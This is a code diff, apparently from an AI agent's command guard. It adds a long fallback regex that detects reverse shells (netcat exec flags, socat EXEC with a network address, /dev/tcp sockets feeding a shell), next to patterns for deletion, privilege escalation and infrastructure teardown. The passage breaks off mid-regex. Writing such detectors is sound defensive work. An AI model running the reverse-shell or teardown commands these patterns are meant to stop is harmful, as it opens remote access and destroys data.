@@ -769,7 +769,7 @@ const FALLBACK_CATASTROPHIC_PATTERNS: RegExp[] = [
 // `isGatedNpxBunx` (shape-based, #96), not by a DANGEROUS pattern, and a blunt
 // fallback matching them would over-gate `npx tsc`; `uvx`/`dlx` (unconditional)
 // ARE covered. Mirrored in scripts/pre-tool-hook.mjs + hermes/sc_client.py.
-const FALLBACK_DANGEROUS_PATTERNS: Array<{ re: RegExp; signal: string; lockPath?: true; dataQuotes?: true; postureTail?: true }> = [
+const FALLBACK_DANGEROUS_PATTERNS: Array<{ re: RegExp; signal: string; lockPath?: true; dataQuotes?: true; postureTail?: true; inertComments?: true }> = [
   { re: /\brm\b|\bunlink\b|\brmdir\b|(?:(?:^|[;&|(\n]|\$\()\s*(?:\w+=\S*\s+)*(?:sudo\s+)?|\bxargs\s+(?:-{1,2}\S+\s+)*|-exec\s+)shred\b/i, signal: 'file-delete' },
   { re: /\bsudo\b|\bdoas\b|\bsu\s/i, signal: 'privilege-escalation' },
   { re: /\bgit\b[^|\n]*\bpush\b[^|\n]*(--force\b|-f\b|\+)/i, signal: 'git-force-push' },
@@ -785,6 +785,8 @@ const FALLBACK_DANGEROUS_PATTERNS: Array<{ re: RegExp; signal: string; lockPath?
   // #503: database / cloud / infrastructure teardown. Every one of these scored `allow` (benign) — the destruction tiers were filesystem-centric. Command position only, so prose and grep for these words stay quiet; an opening quote counts as a command start so `bash -c` / `ssh host '…'` wrappers are still seen. `dataQuotes`: a match inside a quoted argument of a data command (`grep "…"`, `echo '…'`, `git commit -m "…"`) is a mention, as in the real guard — see fallbackDataQuoteRanges. SQL verbs only behind a database client; DELETE gated only with no WHERE.
   // #503 ReDoS: A verb's second gap stops at the next copy of that verb (`(?!\sdelete\b)`), so a verb-dense line with no separator is linear, not quadratic; the matches and spans are unchanged, because the greedy gap already picked the last verb before the target. That rule holds only when the verb ends on the binary's own line, so two spellings keep the plain gap: a verb reached through its own newline (the `(?<=\n)` arm), and a newline INSIDE the two-word `s3 rm` (the `(?=[^\S\n]*\n)` arm; the stopping arm takes same-line `[^\S\n]+` only). Each runs at most once per start, so the row stays linear.
   { re: /(?:^|[;&|(\n"'`]|\$\()\s*(?:\w+=\S*\s+)*(?:sudo\s+)?(?:(?:env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|exec)\b(?:\s+(?:-{1,2}\S+|\w+=\S*|\d+[smhd]?))*\s+)*(?:sudo\s+)?(?:[\w.~-]*\/)*(?:(?:psql|mysql|mariadb|sqlite3|sqlcmd|duckdb|clickhouse(?:-client)?|cockroach)\b[^\n]*\b(?:drop\s+(?:database|schema|table)\b|truncate\s+(?:table\s+)?(?!-)[\w."`[\]]|delete\s+from\s+[\w."`[\]]+\s*(?:;|["']|$))|dropdb\b|mysqladmin\b[^|;&\n]*\sdrop\b|mongo(?:sh)?\b[^\n]*(?:dropDatabase|\.drop)\s*\(|redis-cli\b[^|;&\n]*\bflush(?:all|db)\b|(?:terraform|tofu|terragrunt)\b[^|;&\n]*\s(?:destroy\b|(?<=\n)apply\b[^|;&\n]*\s-destroy\b|apply\b(?:(?!\sapply\b)[^|;&\n])*\s-destroy\b)|pulumi\b[^|;&\n]*\s(?:destroy|down)\b|kubectl\b[^|;&\n]*\s(?:(?<=\n)delete\b[^|;&\n]*|delete\b(?:(?!\sdelete\b)[^|;&\n])*)\s(?:ns|namespaces?|pvc?|persistentvolumes?|persistentvolumeclaims?|deploy(?:ments?)?|statefulsets?|sts|nodes?|crds?|customresourcedefinitions?|all)\b(?![-.])|kubectl\b[^|;&\n]*\s(?:(?<=\n)delete\b[^|;&\n]*|delete\b(?:(?!\sdelete\b)[^|;&\n])*)\s--all\b|helm\b[^|;&\n]*\s(?:uninstall|delete)\b|aws\b[^|;&\n]*\s(?:terminate-instances|delete-[\w-]+|rb|(?<=\n)s3\s+rm\b[^|;&\n]*\s--recursive|s3(?=[^\S\n]*\n)\s+rm\b[^|;&\n]*\s--recursive|s3[^\S\n]+rm\b(?:(?!\ss3\s+rm\b)[^|;&\n])*\s--recursive)\b|gcloud\b[^|;&\n]*\sdelete\b|gsutil\b[^|;&\n]*\s(?:rb\b|(?<=\n)rm\b[^|;&\n]*\s-\w*r|rm\b(?:(?!\srm\b)[^|;&\n])*\s-\w*r)|az\b[^|;&\n]*\s(?:group|vm)\s+delete\b|doctl\b[^|;&\n]*\s(?:delete|rm)\b|gh\s+(?:repo\s+delete\b|api\b[^|;&\n]*(?:-X|--method)[\s=]*DELETE\b)|docker(?:-compose)?\b[^|;&\n]*\s(?:system\s+prune|volume\s+(?:prune|rm)|(?<=\n)down\b[^|;&\n]*\s(?:-v|--volumes)\b|down\b(?:(?!\sdown\b)[^|;&\n])*\s(?:-v|--volumes)\b)|(?:flyctl|fly)\s+(?:apps?\s+(?:destroy|delete)|destroy|volumes?\s+(?:destroy|delete)|postgres\s+(?:destroy|delete))\b|heroku\s+(?:apps:destroy|pg:reset)\b|vercel\s+(?:rm|remove)\b|wrangler\s+delete\b)/i, signal: 'destroy-data-or-infra', dataQuotes: true },
+  // #1005: reverse shell — netcat exec flags or netcat piped into a shell, socat EXEC:/SYSTEM:/SHELL: with a network address, a shell whose stdin is a /dev/tcp|udp socket, `exec N<>/dev/tcp` then a shell on that descriptor, an interactive shell piped into netcat. Mirrors the guard row byte for byte (see its comment for the arms, command position and why it stays linear). `dataQuotes`: a hit inside a data quote (`echo "…"`, `grep "…"`) is a mention. `inertComments`: the row runs on the text with its shell comments blanked, as the guard strips them (`# docs: 'nc -e'` runs nothing).
+  { re: /(?:^|(?<![^\\]\\)(?:[;|("'`]|(?<![<>])&(?!>)|(?<![^\\]\\\r)\n))[^\S\n]*(?:(?:(?:if|then|elif|else|while|until|do|!|\{)|\w+=(?:[^\s;&|"'`(\\<>]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n])*|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?:[^\s;&|"'`(\\<>]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n])+)(?:[^\S\n]|(?<!\\)\\\r?\n)+)*(?:(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:(?:-(?:(?:[ABEFGHIJKLMNOPQSVWXYZbdefijklmnoqsvwxyz]*[acughpCUrtTDR](?=[^\S\n]|\\\r?\n)|-(?:auth-type|login-class|user|group|host|prompt|close-from|other-user|role|type|command-timeout|chdir|chroot)(?=[^\S\n]|\\\r?\n))(?:[^\S\n]|(?<!\\)\\\r?\n)+(?![\s#]|\\\r?\n)|(?![ABEFGHIJKLMNOPQSVWXYZbdefijklmnoqsvwxyz]*[acughpCUrtTDR](?=[^\S\n]|\\\r?\n)|-(?:auth-type|login-class|user|group|host|prompt|close-from|other-user|role|type|command-timeout|chdir|chroot)(?=[^\S\n]|\\\r?\n)))|\w+=|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?![<>&\s]))(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))*))*|doas(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:(?:-(?:(?:[ABDEFGHIJKLMNOPQRSTUVWXYZbcdefghijklmnopqrstvwxyz]*[auC](?=[^\S\n]|\\\r?\n))(?:[^\S\n]|(?<!\\)\\\r?\n)+(?![\s#]|\\\r?\n)|(?![ABDEFGHIJKLMNOPQRSTUVWXYZbcdefghijklmnopqrstvwxyz]*[auC](?=[^\S\n]|\\\r?\n)))|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?![<>&\s]))(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))*))*|env(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:(?:-(?:(?:[ABDEFGHIJKLMNOQRTUVWXYZbcdefghijklmnopqrstvwxyz]*[auCSP](?=[^\S\n]|\\\r?\n)|-(?:argv0|unset|chdir|split-string)(?=[^\S\n]|\\\r?\n))(?:[^\S\n]|(?<!\\)\\\r?\n)+(?![\s#]|\\\r?\n)|(?![ABDEFGHIJKLMNOQRTUVWXYZbcdefghijklmnopqrstvwxyz]*[auCSP](?=[^\S\n]|\\\r?\n)|-(?:argv0|unset|chdir|split-string)(?=[^\S\n]|\\\r?\n)))|\w+=|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?![<>&\s]))(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))*))*|timeout(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:(?:\d+(?:\.\d*)?|\.\d+)[smhd]?(?=[^\S\n]|\\\r?\n)|(?:-(?:(?:[A-Zabcdefghijlmnopqrtuvwxyz]*[sk](?=[^\S\n]|\\\r?\n)|-(?:signal|kill-after)(?=[^\S\n]|\\\r?\n))(?:[^\S\n]|(?<!\\)\\\r?\n)+(?![\s#]|\\\r?\n)|(?![A-Zabcdefghijlmnopqrtuvwxyz]*[sk](?=[^\S\n]|\\\r?\n)|-(?:signal|kill-after)(?=[^\S\n]|\\\r?\n)))|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?![<>&\s]))(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))*))*|time(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:(?:-(?:(?:[A-Zabcdeghijklmnpqrstuvwxyz]*[fo](?=[^\S\n]|\\\r?\n)|-(?:format|output)(?=[^\S\n]|\\\r?\n))(?:[^\S\n]|(?<!\\)\\\r?\n)+(?![\s#]|\\\r?\n)|(?![A-Zabcdeghijklmnpqrstuvwxyz]*[fo](?=[^\S\n]|\\\r?\n)|-(?:format|output)(?=[^\S\n]|\\\r?\n)))|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?![<>&\s]))(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))*))*|stdbuf(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:(?:-(?:(?:[A-Zabcdfghjklmnpqrstuvwxyz]*[ioe](?=[^\S\n]|\\\r?\n)|-(?:input|output|error)(?=[^\S\n]|\\\r?\n))(?:[^\S\n]|(?<!\\)\\\r?\n)+(?![\s#]|\\\r?\n)|(?![A-Zabcdfghjklmnpqrstuvwxyz]*[ioe](?=[^\S\n]|\\\r?\n)|-(?:input|output|error)(?=[^\S\n]|\\\r?\n)))|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?![<>&\s]))(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))*))*|nice(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:(?:-(?:(?:[A-Zabcdefghijklmopqrstuvwxyz]*[n](?=[^\S\n]|\\\r?\n)|-(?:adjustment)(?=[^\S\n]|\\\r?\n))(?:[^\S\n]|(?<!\\)\\\r?\n)+(?![\s#]|\\\r?\n)|(?![A-Zabcdefghijklmopqrstuvwxyz]*[n](?=[^\S\n]|\\\r?\n)|-(?:adjustment)(?=[^\S\n]|\\\r?\n)))|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?![<>&\s]))(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))*))*|ionice(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:(?:-(?:(?:[ABCDEFGHIJKLMNOQRSTUVWXYZabdefghijklmoqrstvwxyz]*[cnpPu](?=[^\S\n]|\\\r?\n)|-(?:class|classdata|pid|pgid|uid)(?=[^\S\n]|\\\r?\n))(?:[^\S\n]|(?<!\\)\\\r?\n)+(?![\s#]|\\\r?\n)|(?![ABCDEFGHIJKLMNOQRSTUVWXYZabdefghijklmoqrstvwxyz]*[cnpPu](?=[^\S\n]|\\\r?\n)|-(?:class|classdata|pid|pgid|uid)(?=[^\S\n]|\\\r?\n)))|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?![<>&\s]))(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))*))*|exec(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:(?:-(?:(?:[A-Zbcdefghijklmnopqrstuvwxyz]*[a](?=[^\S\n]|\\\r?\n))(?:[^\S\n]|(?<!\\)\\\r?\n)+(?![\s#]|\\\r?\n)|(?![A-Zbcdefghijklmnopqrstuvwxyz]*[a](?=[^\S\n]|\\\r?\n)))|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?![<>&\s]))(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))*))*|(?:nohup|setsid|command|builtin|busybox)(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:(?:-|(?:\d+|&(?=>))?(?:<>|>>|[<>]&?)[^\S\n]*(?![<>&\s]))(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))*))*)(?:[^\S\n]|(?<!\\)\\\r?\n)+)*(?:(?:'(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)'|"(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)"|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat))(?=[\s;&|)<>]|\\\r?\n|(?![\s\S]))(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?!["']?(?:-[A-Za-z]*[ec]|--(?:sh-|lua-)?exec(?![\w-])))(?!#)(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))+)*(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+["']?(?:-[A-Za-z]*[ec]|--(?:sh-|lua-)?exec(?![\w-]))|[^\S\n]*\|(?!\|)[^\S\n]*(?:'(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash)'|"(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash)"|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash))(?=[\s;&|)<>]|\\\r?\n|(?![\s\S])))|(?:'(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?socat'|"(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?socat"|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?socat)(?=[\s;&|)<>]|\\\r?\n|(?![\s\S]))(?=(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?!["']?(?:[eE][xX][eE][cC]|[sS][yY][sS][tT][eE][mM]|[sS][hH][eE][lL][lL]):)(?!#)(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))+)*(?:[^\S\n]|(?<!\\)\\\r?\n)+["']?(?:[eE][xX][eE][cC]|[sS][yY][sS][tT][eE][mM]|[sS][hH][eE][lL][lL]):)(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?!["']?(?:[tT][cC][pP]|[uU][dD][pP]|[sS][cC][tT][pP]|[oO][pP][eE][nN][sS][sS][lL]|[sS][sS][lL]|[sS][oO][cC][kK][sS]|[pP][rR][oO][xX][yY]|[vV][sS][oO][cC][kK])[\w-]*:)(?!#)(?:[^\s;&|"'`(\\]|(?!["'(][^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)|\w+=|(?:\d+|&(?=>))?[<>]|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:sudo|doas|env|nohup|timeout|time|stdbuf|nice|ionice|setsid|command|builtin|exec|busybox)(?:[^\S\n]|(?<!\\)\\\r?\n)|["']?(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)|socat)(?![\w.-])))["'(]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))+)*(?:[^\S\n]|(?<!\\)\\\r?\n)+["']?(?:[tT][cC][pP]|[uU][dD][pP]|[sS][cC][tT][pP]|[oO][pP][eE][nN][sS][sS][lL]|[sS][sS][lL]|[sS][oO][cC][kK][sS]|[pP][rR][oO][xX][yY]|[vV][sS][oO][cC][kK])[\w-]*:|(?:'(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash)'|"(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash)"|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash))(?=[\s;&|)<>]|\\\r?\n|(?![\s\S]))(?:(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?!-[A-Za-z]*i[A-Za-z]*(?![^\s;&|]))(?!#)(?:[^\s;&|"'`()\\]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))+)*(?:[^\S\n]|(?<!\\)\\\r?\n)+-[A-Za-z]*i[A-Za-z]*(?![^\s;&|])(?:(?:[^\S\n]|(?<!\\)\\\r?\n)+(?!#)(?:[^\s;&|"'`()\\]|(?<!\\)\\[^\r\n]|(?<=[<>])&|(?<![<>])&(?=>))+)*[^\S\n]*\|(?!\|)[^\S\n]*(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:nc(?:\.(?:traditional|openbsd))?|netcat|ncat)(?=[\s;&|)<>]|\\\r?\n|(?![\s\S]))|(?:(?!(?<![^\\]\\)(?<![\d<>&])0?<>?[^\S\n]*(?:"\/dev\/(?:tcp|udp)\/[^"\s]*"|'\/dev\/(?:tcp|udp)\/[^'\s]*'|\/dev\/(?:tcp|udp)\/)|(?<![^\\]\\)(?:[<>&]|>\|)[^\S\n]*(?:"\/dev\/(?:tcp|udp)\/[^"\s]*"|'\/dev\/(?:tcp|udp)\/[^'\s]*'|\/dev\/(?:tcp|udp)\/))(?:[^\n;&|"'`()\\]|(?<!\\)\\[^\r\n]|(?<!\\)\\\r?\n|(?<=[<>])&|(?<![<>])&(?=>)))*(?:(?<![^\\]\\)(?<![\d<>&])0?<>?[^\S\n]*(?:"\/dev\/(?:tcp|udp)\/[^"\s]*"|'\/dev\/(?:tcp|udp)\/[^'\s]*'|\/dev\/(?:tcp|udp)\/)|(?<![^\\]\\)(?:[<>&]|>\|)[^\S\n]*(?:"\/dev\/(?:tcp|udp)\/[^"\s]*"|'\/dev\/(?:tcp|udp)\/[^'\s]*'|\/dev\/(?:tcp|udp)\/)(?:(?!(?<![^\\]\\)(?<![\d<>&])(?:0?<&|0>&)(?![0-](?!\d))|(?<![^\\]\\)(?<![\d<>&])0?<>?[^\S\n]*(?:"\/dev\/(?:tcp|udp)\/[^"\s]*"|'\/dev\/(?:tcp|udp)\/[^'\s]*'|\/dev\/(?:tcp|udp)\/))(?:[^\n;&|"'`()\\]|(?<!\\)\\[^\r\n]|(?<!\\)\\\r?\n|(?<=[<>])&|(?<![<>])&(?=>)))*(?:(?<![^\\]\\)(?<![\d<>&])(?:0?<&|0>&)(?![0-](?!\d))|(?<![^\\]\\)(?<![\d<>&])0?<>?[^\S\n]*(?:"\/dev\/(?:tcp|udp)\/[^"\s]*"|'\/dev\/(?:tcp|udp)\/[^'\s]*'|\/dev\/(?:tcp|udp)\/)))))|\bexec(?:[^\S\n]|(?<!\\)\\\r?\n)+(?:\d+|\{\w+\})(?:<>|<)[^\S\n]*(?:"\/dev\/(?:tcp|udp)\/[^"\s]*"|'\/dev\/(?:tcp|udp)\/[^'\s]*'|\/dev\/(?:tcp|udp)\/)(?:(?!\/dev\/(?:tcp|udp)\/)[\s\S])*?(?:(?<![^\\]\\)(?:[;|(`]|(?<![<>])&(?!>)|(?<![^\\]\\\r)\n)[^\S\n]*(?:(?:if|then|elif|else|while|until|do|!|\{)(?:[^\S\n]|(?<!\\)\\\r?\n)+)*(?:(?:'(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash)'|"(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?(?:bash|sh|zsh|dash|ksh|ash)"|(?:(?:\.{1,2}|~[\w-]*)?\/(?:[\w.~-]*\/)*)?